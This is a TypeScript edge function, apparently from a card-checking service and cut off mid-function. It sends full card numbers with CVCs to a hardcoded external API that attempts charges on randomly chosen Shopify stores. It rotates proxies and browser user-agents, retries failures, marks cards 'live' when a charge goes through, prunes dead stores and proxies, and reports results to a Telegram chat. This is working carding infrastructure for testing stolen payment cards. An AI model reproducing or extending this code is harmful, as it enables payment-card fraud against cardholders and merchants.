import { createClient } from "npm:@supabase/supabase-js@2.90.1";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
};

const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
const SUPABASE_ANON_KEY = Deno.env.get("SUPABASE_ANON_KEY")!;
const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
const SHOPIFY_DEBUG_CHAT_ID = "-1003848532661";

const API_URL = "http://108.165.12.183:8081/";
const buildApiUrl = (cc: string, site: string, proxy: string) =>
  proxy
    ? `${API_URL}?cc=${encodeURIComponent(cc)}&url=${encodeURIComponent(site)}&proxy=${encodeURIComponent(proxy)}`
    : `${API_URL}?cc=${encodeURIComponent(cc)}&url=${encodeURIComponent(site)}`;

const badResponses = [
  "Site not supported",
  "PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH",
  "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED",
  "Payment method not available",
  "ARTIFACT_DISSATISFACTION",
  "VALIDATION_CUSTOM",
  '"Gateway":"Authorize.net"',
];

// Responses that need 3 consecutive hits before removing a site
const strikeResponses = ["MERCHANDISE_EXPECTED_PRICE_MISMATCH"];
// In-memory strike counter: site URL -> consecutive strike count
const siteStrikeCounter: Record<string, number> = {};
const STRIKE_THRESHOLD = 3;

const sendAdminDebug = async (
  cc: string,
  status: string,
  message: string,
  rawResponse: string,
  username?: string,
  site?: string
) => {
  if (!TELEGRAM_BOT_TOKEN) return;

  try {
    const maskedCard = cc.replace(/^(\d{6})(\d+)(\d{4})/, '$1******$3');
    const timestamp = new Date().toISOString().replace('T', ' ').slice(0, 19);
    const truncatedRaw = rawResponse.length > 1500 
      ? rawResponse.substring(0, 1500) + '... [truncated]' 
      : rawResponse;
    
    const debugMessage = `🔧 <b>SHOPIFY CHARGE DEBUG</b>

📇 <b>Card:</b> <code>${maskedCard}</code>
👤 <b>User:</b> ${username || 'Unknown'}
🌐 <b>Site:</b> <code>${site || 'N/A'}</code>
📊 <b>Status:</b> ${status.toUpperCase()}
💬 <b>Message:</b> ${message}

━━━━ RAW API RESPONSE ━━━━
<pre>${truncatedRaw}</pre>

🕐 ${timestamp}`;

    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: SHOPIFY_DEBUG_CHAT_ID,
        text: debugMessage,
        parse_mode: "HTML",
      }),
    });
  } catch (error) {
    console.error("[SHOPIFY-CHARGE] Failed to send admin debug:", error);
  }
};

const notifyChargedCard = (
  userId: string,
  cardDetails: string,
  status: "CHARGED" | "DECLINED" | "UNKNOWN",
  responseMessage: string,
  amount: string,
  gateway: string
) => {
  if (!SUPABASE_SERVICE_ROLE_KEY) return;

  fetch(`${SUPABASE_URL}/functions/v1/notify-charged-card`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Authorization": `Bearer ${SUPABASE_SERVICE_ROLE_KEY}`,
    },
    body: JSON.stringify({
      user_id: userId,
      card_details: cardDetails,
      status,
      response_message: responseMessage,
      amount,
      gateway,
    }),
  }).catch((err) => console.error("[SHOPIFY-CHARGE] notify-charged-card error:", err));
};

const extractPrice = (response: string): { price: number; priceStr: string } => {
  const pricePatterns = [
    /\$[\d,]+\.?\d*/g,
    /USD\s*[\d,]+\.?\d*/gi,
    /"price":\s*"?[\d.]+/gi,
    /"amount":\s*"?[\d.]+/gi,
    /"total":\s*"?[\d.]+/gi,
  ];

  let lowestPrice = Infinity;
  let priceStr = "$0.00";

  for (const pattern of pricePatterns) {
    const matches = response.match(pattern);
    if (matches) {
      for (const match of matches) {
        const numericMatch = match.replace(/[^0-9.]/g, "");
        const value = parseFloat(numericMatch);
        if (!isNaN(value) && value > 0 && value < lowestPrice) {
          lowestPrice = value;
          priceStr = `$${value.toFixed(2)}`;
        }
      }
    }
  }

  return {
    price: lowestPrice === Infinity ? 0 : lowestPrice,
    priceStr: lowestPrice === Infinity ? "$0.00" : priceStr,
  };
};

const userAgents = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
];

const getRandomItem = <T>(arr: T[]): T => arr[Math.floor(Math.random() * arr.length)];

const PROXY_DEAD_INDICATORS = [
  "proxy dead", "proxy error", "proxy authentication", "connection refused",
  "proxy connect", "tunneling socket", "proxy_error", "bad proxy",
  "cannot connect to host", "socks", "econnrefused", "econnreset",
];

const SITE_DEAD_INDICATORS = [
  "site dead",
];

type ApiCheckResult = {
  status: string;
  message: string;
  apiResponse: string;
  rawResponse: string;
  price: number;
  priceStr: string;
  proxyDead?: boolean;
  siteDead?: boolean;
};

const UNKNOWN_RETRY_ATTEMPTS = 2;
// Global deadline (ms) — must stay safely under the 150s edge-runtime IDLE_TIMEOUT
const GLOBAL_DEADLINE_MS = 120_000;
const wait = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));

const callApiOnce = async (cc: string, site: string, proxy: string): Promise<ApiCheckResult> => {
  const apiUrl = buildApiUrl(cc, site, proxy);
  
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), 25000);
  
  try {
    const response = await fetch(apiUrl, {
      method: 'GET',
      headers: { 
        'Accept': 'application/json, text/plain, */*',
        'User-Agent': getRandomItem(userAgents),
        'Cache-Control': 'no-cache',
      },
      signal: controller.signal,
    });
    
    clearTimeout(timeoutId);
    const rawText = await response.text();
    
    if (!rawText || rawText.trim() === '') {
      return { status: 'unknown', message: 'Empty response', apiResponse: '', rawResponse: '', price: 0, priceStr: '$0.00' };
    }

    const rawLower = rawText.toLowerCase();

    // Check for curl/DNS/transient API errors — treat as UNKNOWN (retryable)
    const isCurlTransient = rawLower.includes('failed to perform') || rawLower.includes('getaddrinfo') || rawLower.includes('could not resolve proxy') || rawLower.includes('tokenize_fail') || rawLower.includes('no_session_token');
    if (isCurlTransient) {
      return { status: 'unknown', message: 'Transient error (retryable)', apiResponse: '', rawResponse: rawText, price: 0, priceStr: '$0.00' };
    }

    // Check for proxy dead indicators FIRST
    const isProxyDead = PROXY_DEAD_INDICATORS.some(ind => rawLower.includes(ind));
    if (isProxyDead) {
      return { status: 'dead', message: 'Proxy Dead', apiResponse: 'Proxy Dead', rawResponse: rawText, price: 0, priceStr: '$0.00', proxyDead: true };
    }

    // Check for site dead indicators
    const isSiteDead = SITE_DEAD_INDICATORS.some(ind => rawLower.includes(ind));
    if (isSiteDead) {
      return { status: 'dead', message: 'Site Dead', apiResponse: 'Site Dead', rawResponse: rawText, price: 0, priceStr: '$0.00', siteDead: true };
    }

    // Check for bad responses
    const isBadResponse = badResponses.some(bad => rawText.toLowerCase().includes(bad.toLowerCase()));
    // Check for DELIVERY_ADDRESS — classify as DECLINED
    if (rawText.includes('DELIVERY_ADDRESS')) {
      return { status: 'dead', message: 'DELIVERY_ADDRESS error - Declined', apiResponse: 'DELIVERY_ADDRESS', rawResponse: rawText, price: 0, priceStr: '$0.00' };
    }

    // Check for strike responses (e.g. MERCHANDISE_EXPECTED_PRICE_MISMATCH) — track per site, remove after 3 consecutive
    const matchedStrike = strikeResponses.find(s => rawText.toLowerCase().includes(s.toLowerCase()));
    if (matchedStrike) {
      // This is still a dead result for the card
      return { status: 'dead', message: `${matchedStrike} - site issue`, apiResponse: matchedStrike, rawResponse: rawText, price: 0, priceStr: '$0.00' };
    }

    if (isBadResponse) {
      return { status: 'dead', message: 'Bad response - site issue', apiResponse: '', rawResponse: rawText, price: 0, priceStr: '$0.00' };
    }

    let { price, priceStr } = extractPrice(rawText);
    
    let apiStatus = 'unknown';
    let apiMessage = rawText;
    let apiResponse = '';

    // Helper: check if a response is essentially empty/meaningless (should be UNKNOWN, not DEAD)
    const isEmptyOrErrorOnly = (text: string): boolean => {
      const trimmed = text.trim().toLowerCase();
      return !trimmed || trimmed === 'error:' || trimmed === 'error' || trimmed === 'error: ' || trimmed.length < 3;
    };
    
    try {
      // The new API may wrap JSON in a "detail" envelope: {"detail": {...}}
      let json = JSON.parse(rawText);
      if (json.detail && typeof json.detail === 'object') {
        json = json.detail;
      }
      
      // Extract Price and Response directly from API JSON
      if (json.Price !== undefined && Number(json.Price) > 0) {
        price = Number(json.Price);
        priceStr = `$${price.toFixed(2)}`;
      }
      if (json.Response) {
        apiResponse = String(json.Response).replace(/<[^>]*>/g, '');
      }
      
      // Prefer the Response field as the human-readable message
      apiMessage = json.Response || json.message || json.msg || json.error || rawText;

      // If the API returned an empty/meaningless response, treat as unknown
      const responseText = (apiResponse || apiMessage || '').trim();
      if (isEmptyOrErrorOnly(responseText) && price === 0) {
        apiStatus = 'unknown';
      } else if (String(json.Charge).toLowerCase() === 'true' || json.Charge === true || json.status === 'CHARGED' || json.status === 'success' || json.full_response === true || json.status === 'ORDER_COMPLETED' || json.Response === 'ORDER_COMPLETED' || json.Response === 'Order completed 💎') {
        apiStatus = 'live';
        apiMessage = json.Response || json.message || 'Charged';
      } else if (json.status === 'DECLINED' || json.status === 'failed' || json.full_response === false || json.status === 'DS_REQUIRED' || json.status === '3DS_REQUIRED' || json.status === 'OTP_REQUIRED' || json.Response === 'OTP_REQUIRED') {
        apiStatus = 'dead';
        apiMessage = json.Response || json.message || json.error || 'Declined';
      } else if (json.Response === 'ERROR' && json.details?.error) {
        // New API format: {"Response":"ERROR","details":{"error":"Cart add failed: 503"}}
        apiStatus = 'dead';
        apiMessage = json.details.error;
        apiResponse = json.details.error;
      } else if (json.status === 'error') {
        const errMsg = (json.message || json.error || '').trim().toLowerCase();
        if (errMsg && errMsg !== 'error:' && errMsg !== 'error' && errMsg.length > 5) {
          apiStatus = 'dead';
          apiMessage = json.message || json.error || 'Declined';
        } else {
          apiStatus = 'unknown';
          apiMessage = 'Request failed';
        }
      } else {
        const responseLower = (apiResponse || '').toLowerCase();
        const msgLower = String(apiMessage).toLowerCase();
        const combinedText = msgLower + ' ' + responseLower;
        
        if (combinedText.includes('order_placed') || combinedText.includes('order placed') || 
            combinedText.includes('order completed') || combinedText.includes('order_completed') ||
            combinedText.includes('thank you') || combinedText.includes('thankyou') ||
            combinedText.includes('charged') || combinedText.includes('success') || 
            combinedText.includes('approved')) {
          apiStatus = 'live';
        } else if (combinedText.includes('declined') || combinedText.includes('invalid') || combinedText.includes('expired') || 
                   combinedText.includes('insufficient') || combinedText.includes('card_declined') || combinedText.includes('incorrect') ||
                   combinedText.includes('do_not_honor') || combinedText.includes('fraud') || combinedText.includes('not accepted') ||
                   combinedText.includes('ds_required') || combinedText.includes('3ds') || combinedText.includes('3d_secure') ||
                   combinedText.includes('rejected') || combinedText.includes('otp_required') || combinedText.includes('otp required') ||
                   combinedText.includes('pickup_card') || combinedText.includes('lost_card') || combinedText.includes('stolen_card') ||
                   combinedText.includes('restricted') || combinedText.includes('not_permitted') || combinedText.includes('generic_decline') ||
                   combinedText.includes('generic_error')) {
          apiStatus = 'dead';
        } else if (combinedText.includes('failed') || combinedText.includes('error')) {
          const substantive = combinedText.replace(/error:?\s*/g, '').replace(/failed:?\s*/g, '').trim();
          if (substantive.length > 3) {
            apiStatus = 'dead';
          }
        }
      }
    } catch {
      const lower = rawText.toLowerCase();
      if (isEmptyOrErrorOnly(lower)) {
        apiStatus = 'unknown';
      } else if (lower.includes('order_placed') || lower.includes('order placed') || lower.includes('order completed') || lower.includes('order_completed') ||
          lower.includes('thank you') || lower.includes('charged') || lower.includes('success') || lower.includes('approved')) {
        apiStatus = 'live';
      } else if (lower.includes('declined') || lower.includes('invalid') || lower.includes('expired') || 
                 lower.includes('insufficient') || lower.includes('otp_required') || lower.includes('otp required') ||
                 lower.includes('ds_required') || lower.includes('3ds') || lower.includes('rejected')) {
        apiStatus = 'dead';
      } else if (lower.includes('failed') || lower.includes('error')) {
        const substantive = lower.replace(/error:?\s*/g, '').replace(/failed:?\s*/g, '').trim();
        if (substantive.length > 3) {
          apiStatus = 'dead';
        }
      }
    }
    
    return { status: apiStatus, message: apiMessage, apiResponse, rawResponse: rawText, price, priceStr };
    
  } catch (error) {
    clearTimeout(timeoutId);
    const errMsg = error instanceof Error ? error.message : 'Error';
    return { status: 'unknown', message: errMsg.includes('abort') ? 'Timeout' : errMsg, apiResponse: '', rawResponse: errMsg, price: 0, priceStr: '$0.00' };
  }
};

// Wrapper with automatic retry for all unknown responses
const callApi = async (cc: string, site: string, proxy: string): Promise<ApiCheckResult> => {
  console.log(`[SHOPIFY-CHARGE] Calling: site=${site} proxy=${proxy ? 'yes' : 'none'}`);
  
  let result = await callApiOnce(cc, site, proxy);
  
  // If proxy dead or site dead, return immediately — no retry needed
  if (result.proxyDead || result.siteDead) {
    console.log(`[SHOPIFY-CHARGE] Result: ${result.proxyDead ? 'PROXY DEAD' : 'SITE DEAD'}`);
    return result;
  }
  
  // If result is a definitive live/dead, return immediately
  if (result.status === 'live' || result.status === 'dead') {
    console.log(`[SHOPIFY-CHARGE] Result: ${result.status}`);
    return result;
  }
  
  // Retry every unknown result, not just specific message patterns
  if (result.status === 'unknown') {
    for (let retry = 1; retry <= UNKNOWN_RETRY_ATTEMPTS; retry++) {
      const delayMs = 1000 * retry + Math.floor(Math.random() * 500);
      console.log(
        `[SHOPIFY-CHARGE] Retry ${retry}/${UNKNOWN_RETRY_ATTEMPTS} after unknown: ${result.message} (${delayMs}ms)`
      );
      await wait(delayMs);

      result = await callApiOnce(cc, site, proxy);
      console.log(
        `[SHOPIFY-CHARGE] Retry ${retry}/${UNKNOWN_RETRY_ATTEMPTS} result: ${result.status} - ${result.message}`
      );

      if (result.proxyDead || result.siteDead) {
        return result;
      }

      if (result.status === 'live' || result.status === 'dead') {
        return result;
      }
    }
  }
  
  return result;
};

Deno.serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const authHeader = req.headers.get("Authorization");
    if (!authHeader?.startsWith("Bearer ")) {
      return new Response(JSON.stringify({ error: "Unauthorized" }), 
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    const body = await req.json();
    const { cc, priceGroup, userId: bodyUserId } = body;
    
    // Allow warmup calls to pass through without validation
    if (!cc || cc === 'warmup') {
      return new Response(JSON.stringify({ status: 'ok', warmup: true }), 
        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
    }

    // Quick format validation - CVC required
    const parts = cc.split('|');
    if (parts.length < 4 || !parts[3] || parts[3].length < 3 || !/^\d+$/.test(parts[3])) {
      return new Response(JSON.stringify({ error: "Format: CardNumber|MM|YY|CVC", computedStatus: 'dead' }), 
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
    }

    // Detect service-role calls (used by the Telegram bot for /msh, /mtxt).
    // When the caller presents the SERVICE_ROLE_KEY and provides a userId in the body,
    // we trust the caller and resolve the user directly — no JWT required.
    const bearer = authHeader.slice(7).trim();
    const isServiceRoleCall = !!SUPABASE_SERVICE_ROLE_KEY && bearer === SUPABASE_SERVICE_ROLE_KEY && !!bodyUserId;

    const adminClient = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY);

    let user: { id: string; email?: string | null } | null = null;
    let profile: { is_banned: boolean | null; username: string | null } | null = null;

    if (isServiceRoleCall) {
      const { data: prof } = await adminClient
        .from("profiles")
        .select("user_id, is_banned, username")
        .eq("user_id", bodyUserId)
        .single();
      if (!prof) {
        return new Response(JSON.stringify({ error: "User not found" }), 
          { status: 404, headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }
      if (prof.is_banned) {
        return new Response(JSON.stringify({ error: "Account suspended" }), 
          { status: 403, headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }
      user = { id: prof.user_id, email: null };
      profile = { is_banned: prof.is_banned, username: prof.username };
    } else {
      // Standard JWT auth path (web app)
      const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
        global: { headers: { Authorization: authHeader } },
      });

      const { data: { user: authUser }, error: authError } = await supabase.auth.getUser();
      if (authError || !authUser) {
        return new Response(JSON.stringify({ error: "Invalid token" }), 
          { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      const { data: prof } = await supabase
        .from("profiles")
        .select("is_banned, username")
        .eq("user_id", authUser.id)
        .single();

      if (prof?.is_banned) {
        return new Response(JSON.stringify({ error: "Account suspended" }), 
          { status: 403, headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      user = { id: authUser.id, email: authUser.email };
      profile = prof ?? null;
    }

    // Get a random site from gateway_urls using service role (only sites <= $100)
    
    // Build query - filter by price group if specified
    let sitesQuery = adminClient
      .from('gateway_urls')
      .select('url, price')
      .not('url', 'like', 'https://razorpay.me/%')
      .lte('price', 100);
    
    if (priceGroup && typeof priceGroup.min === 'number' && typeof priceGroup.max === 'number') {
      sitesQuery = sitesQuery.gte('price', priceGroup.min);
      if (priceGroup.max < 100) {
        sitesQuery = sitesQuery.lt('price', priceGroup.max);
      }
      console.log(`[SHOPIFY-CHARGE] Filtering sites by price range: $${priceGroup.min}-$${priceGroup.max}`);
    }
    
    const { data: sites, error: sitesError } = await sitesQuery.order('created_at', { ascending: false });

    if (sitesError || !sites || sites.length === 0) {
      return new Response(JSON.stringify({ 
        error: 'No Shopify sites available. Admin needs to add sites via Health Check.', 
        computedStatus: 'unknown' 
      }), { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
    }

    // Multi-site retry loop: try up to 3 different sites on site-level errors
    const MAX_SITE_ATTEMPTS = Math.min(3, sites.length);
    const shuffledSites = [...sites].sort(() => Math.random() - 0.5);
    const triedSiteUrls: string[] = [];
    const badSiteUrls: { url: string; reason: string }[] = [];

    // Get user's own proxies (optional — API works without proxy)
    const { data: userProxies } = await adminClient
      .from('user_proxies')
      .select('*')
      .eq('user_id', user!.id);

    // Shuffle proxies for rotation (empty array if none)
    const shuffledProxies = [...(userProxies || [])].sort(() => Math.random() - 0.5);

    const formatProxy = (p: { ip: string; port: string; username: string | null; password: string | null }) =>
      p.username && p.password ? `${p.ip}:${p.port}:${p.username}:${p.password}` : `${p.ip}:${p.port}`;

    let result: ApiCheckResult | null = null;
    let usedSite = shuffledSites[0];
    const failedProxyIds: string[] = [];
    const deadSiteUrls: string[] = [];
    let allProxiesDeadFlag = false;
    const startedAt = Date.now();
    const deadlineExceeded = () => (Date.now() - startedAt) > GLOBAL_DEADLINE_MS;

    for (let siteAttempt = 0; siteAttempt < MAX_SITE_ATTEMPTS; siteAttempt++) {
      if (deadlineExceeded()) {
        console.log(`[SHOPIFY-CHARGE] Global deadline reached, aborting further site attempts`);
        break;
      }
      const currentSite = shuffledSites[siteAttempt];
      usedSite = currentSite;
      triedSiteUrls.push(currentSite.url);
      console.log(`[SHOPIFY-CHARGE] Site attempt ${siteAttempt + 1}/${MAX_SITE_ATTEMPTS}: ${currentSite.url} (price: ${currentSite.price})`);

      // Try proxies with rotation for this site (or fall back to no-proxy if user has none)
      const availableProxies = shuffledProxies.filter(p => !failedProxyIds.includes(p.id));
      const hadProxies = shuffledProxies.length > 0;
      if (hadProxies && availableProxies.length === 0) {
        allProxiesDeadFlag = true;
        result = { status: 'unknown', message: 'All proxies failed (407)', apiResponse: '', rawResponse: '', price: 0, priceStr: '$0.00' };
        break;
      }

      // If no user proxies configured, perform a single direct call (no proxy)
      const proxyAttempts = availableProxies.length > 0
        ? availableProxies
        : [null as null | typeof shuffledProxies[0]];

      let siteResult: ApiCheckResult | null = null;
      for (let proxyAttempt = 0; proxyAttempt < proxyAttempts.length; proxyAttempt++) {
        const currentProxy = proxyAttempts[proxyAttempt];
        const proxyStr = currentProxy ? formatProxy(currentProxy) : '';
        console.log(`[SHOPIFY-CHARGE] Proxy ${proxyAttempt + 1}/${proxyAttempts.length}: ${currentProxy ? `${currentProxy.ip}:${currentProxy.port}` : 'none (direct)'}`);

        siteResult = await callApi(cc, currentSite.url, proxyStr);

        // If proxy dead flag is set, remove proxy and try next
        if (siteResult.proxyDead && currentProxy) {
          console.log(`[SHOPIFY-CHARGE] Proxy dead detected, removing proxy ${currentProxy.id} (${currentProxy.ip}:${currentProxy.port})`);
          failedProxyIds.push(currentProxy.id);
          // Immediately delete from DB
          adminClient.from('user_proxies').delete().eq('id', currentProxy.id).then(({ error: delErr }) => {
            if (delErr) console.error(`[SHOPIFY-CHARGE] Failed to remove dead proxy ${currentProxy.id}:`, delErr);
            else console.log(`[SHOPIFY-CHARGE] Dead proxy removed from DB: ${currentProxy.id}`);
          });
          continue; // try next proxy
        }

        // If site dead flag is set, remove site and try next site
        if (siteResult.siteDead) {
          console.log(`[SHOPIFY-CHARGE] Site dead detected, removing site: ${currentSite.url}`);
          deadSiteUrls.push(currentSite.url);
          adminClient.from('gateway_urls').delete().eq('url', currentSite.url).then(({ error: delErr }) => {
            if (delErr) console.error(`[SHOPIFY-CHARGE] Failed to remove dead site:`, delErr);
            else console.log(`[SHOPIFY-CHARGE] Dead site removed: ${currentSite.url}`);
          });
          if (TELEGRAM_BOT_TOKEN) {
            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                chat_id: SHOPIFY_DEBUG_CHAT_ID,
                text: `🗑️ <b>SITE DEAD - AUTO-REMOVED</b>\n\n<code>${currentSite.url}</code>\n\n<i>API returned "Site Dead"</i>`,
                parse_mode: "HTML",
              }),
            }).catch(() => {});
          }
          siteResult = null; // force try next site
          break;
        }

        // Legacy proxy error check (407, connection refused without proxyDead flag)
        const rawLower = (siteResult.rawResponse || '').toLowerCase();
        let isValidApiResponse = false;
        try {
          const parsed = JSON.parse(siteResult.rawResponse || '');
          if (parsed && (parsed.Gateway || parsed.Response || parsed.Price !== undefined || parsed.status || parsed.message)) {
            isValidApiResponse = true;
          }
        } catch { /* not valid JSON */ }
        
        const isProxyError = !isValidApiResponse && (
          rawLower.includes('407') || rawLower.includes('proxy error') || 
          rawLower.includes('proxy authentication') || rawLower.includes('connection refused') ||
          rawLower.includes('proxy connect') || rawLower.includes('tunneling socket')
        );
        
        if (isProxyError) {
          console.log(`[SHOPIFY-CHARGE] Proxy error (legacy), removing proxy ${currentProxy.ip}:${currentProxy.port}`);
          failedProxyIds.push(currentProxy.id);
          adminClient.from('user_proxies').delete().eq('id', currentProxy.id).then(({ error: delErr }) => {
            if (delErr) console.error(`[SHOPIFY-CHARGE] Failed to remove proxy ${currentProxy.id}:`, delErr);
            else console.log(`[SHOPIFY-CHARGE] Removed dead proxy: ${currentProxy.id}`);
          });
          continue; // try next proxy
        }
        
        // Proxy worked (or non-proxy error), stop proxy loop
        break;
      }

      if (!siteResult) {
        // Site was dead or all proxies failed for this site — try next site
        if (siteAttempt + 1 < MAX_SITE_ATTEMPTS) {
          await new Promise(r => setTimeout(r, 300 + Math.random() * 300));
        }
        continue;
      }

      // If we got a definitive live/dead result, use it and stop
      if (siteResult.status === 'live' || siteResult.status === 'dead') {
        result = siteResult;
        console.log(`[SHOPIFY-CHARGE] Definitive result from site ${currentSite.url}: ${siteResult.status}`);
        break;
      }

      // Site returned unknown/error — keep as fallback and try next site when available
      const rawLower = (siteResult.rawResponse || '').toLowerCase();
      const isBadSiteResponse = badResponses.some(bad => rawLower.includes(bad.toLowerCase()));
      const isSiteError = !siteResult.rawResponse || rawLower === '' || rawLower.includes('empty response') || rawLower.includes('timeout') || isBadSiteResponse;

      result = siteResult;

      if (isSiteError) {
        const reason = isBadSiteResponse ? 'Bad Shopify response' : (rawLower.includes('timeout') ? 'Timeout' : 'Empty/Error response');
        badSiteUrls.push({ url: currentSite.url, reason });
        console.log(`[SHOPIFY-CHARGE] Site error (${reason}), marking ${currentSite.url} and trying next site...`);
      }

      if (siteAttempt + 1 < MAX_SITE_ATTEMPTS) {
        console.log(
          `[SHOPIFY-CHARGE] Unknown after full retry chain on ${currentSite.url}, trying next site...`
        );
        await wait(300 + Math.random() * 300);
        continue;
      }

      break;
    }

    if (!result) {
      result = { status: 'unknown', message: 'All site attempts failed', apiResponse: '', rawResponse: '', price: 0, priceStr: '$0.00' };
    }

    const allProxiesDead = allProxiesDeadFlag || (shuffledProxies.length > 0 && failedProxyIds.length >= shuffledProxies.length);
    const randomSite = usedSite;

    // Dead proxies already removed inline during the proxy loop above

    // Auto-remove all bad sites discovered during the multi-site retry loop
    for (const badSite of badSiteUrls) {
      console.log(`[SHOPIFY-CHARGE] Removing bad site from retry loop: ${badSite.url} (${badSite.reason})`);
      adminClient.from('gateway_urls').delete().eq('url', badSite.url).then(({ error: delErr }) => {
        if (delErr) console.error('[SHOPIFY-CHARGE] Failed to remove bad site:', delErr);
        else console.log(`[SHOPIFY-CHARGE] Bad site removed: ${badSite.url}`);
      });
      delete siteStrikeCounter[badSite.url];

      if (TELEGRAM_BOT_TOKEN) {
        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: SHOPIFY_DEBUG_CHAT_ID,
            text: `🗑️ <b>SHOPIFY SITE AUTO-REMOVED</b>\n\n<code>${badSite.url}</code>\n\n<i>Reason: ${badSite.reason} (during multi-site retry)</i>`,
            parse_mode: "HTML",
          }),
        }).catch(() => {});
      }
    }

    // Auto-remove bad sites from gateway_urls
    const rawLower = (result.rawResponse || '').toLowerCase();
    const isBadSite = badResponses.some(bad => rawLower.includes(bad.toLowerCase()));
    
    // Check for strike responses — track per site, only remove after 3 consecutive
    const matchedStrikeResponse = strikeResponses.find(s => rawLower.includes(s.toLowerCase()));
    if (matchedStrikeResponse) {
      const key = randomSite.url;
      siteStrikeCounter[key] = (siteStrikeCounter[key] || 0) + 1;
      console.log(`[SHOPIFY-CHARGE] Strike ${siteStrikeCounter[key]}/${STRIKE_THRESHOLD} for site: ${key} (${matchedStrikeResponse})`);
      
      if (siteStrikeCounter[key] >= STRIKE_THRESHOLD) {
        console.log(`[SHOPIFY-CHARGE] Removing site after ${STRIKE_THRESHOLD} consecutive strikes: ${key}`);
        adminClient.from('gateway_urls').delete().eq('url', key).then(({ error: delErr }) => {
          if (delErr) console.error('[SHOPIFY-CHARGE] Failed to remove strike site:', delErr);
          else console.log(`[SHOPIFY-CHARGE] Strike site removed: ${key}`);
        });
        delete siteStrikeCounter[key];

        if (TELEGRAM_BOT_TOKEN) {
          fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: SHOPIFY_DEBUG_CHAT_ID,
              text: `🗑️ <b>SHOPIFY SITE AUTO-REMOVED (3 STRIKES)</b>\n\n<code>${key}</code>\n\n<i>Reason: ${matchedStrikeResponse} x${STRIKE_THRESHOLD}</i>`,
              parse_mode: "HTML",
            }),
          }).catch(() => {});
        }
      }
      // Don't remove site yet if under threshold
    } else if (isBadSite || (result.status === 'unknown' && (!result.rawResponse || rawLower === '' || rawLower.includes('empty response') || rawLower.includes('timeout')))) {
      const removalReason = isBadSite ? 'Bad Shopify response' : 'Empty/Timeout response';
      console.log(`[SHOPIFY-CHARGE] Removing site: ${randomSite.url} - ${removalReason}`);
      adminClient.from('gateway_urls').delete().eq('url', randomSite.url).then(({ error: delErr }) => {
        if (delErr) console.error('[SHOPIFY-CHARGE] Failed to remove site:', delErr);
        else console.log(`[SHOPIFY-CHARGE] Site removed: ${randomSite.url}`);
      });
      // Reset strike counter for this site since it's removed
      delete siteStrikeCounter[randomSite.url];

      if (TELEGRAM_BOT_TOKEN) {
        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: SHOPIFY_DEBUG_CHAT_ID,
            text: `🗑️ <b>SHOPIFY SITE AUTO-REMOVED</b>\n\n<code>${randomSite.url}</code>\n\n<i>Reason: ${removalReason}</i>`,
            parse_mode: "HTML",
          }),
        }).catch(() => {});
      }
    } else {
      // Successful response — reset strike counter for this site
      if (siteStrikeCounter[randomSite.url]) {
        delete siteStrikeCounter[randomSite.url];
      }
    }

    // Update site price in DB if API returned a valid price, remove if > $100
    if (result.price > 0 && !isBadSite) {
      if (result.price > 100) {
        console.log(`[SHOPIFY-CHARGE] Removing site ${randomSite.url} - price $${result.price} exceeds $100 limit`);
        adminClient.from('gateway_urls').delete().eq('url', randomSite.url).then(({ error: delErr }) => {
          if (delErr) console.error('[SHOPIFY-CHARGE] Failed to remove expensive site:', delErr);
          else console.log(`[SHOPIFY-CHARGE] Expensive site removed: ${randomSite.url}`);
        });
      } else if (result.price !== Number(randomSite.price)) {
        // Update the stored price to match actual API price
        adminClient.from('gateway_urls').update({ price: result.price }).eq('url', randomSite.url).then(({ error: upErr }) => {
          if (upErr) console.error('[SHOPIFY-CHARGE] Failed to update site price:', upErr);
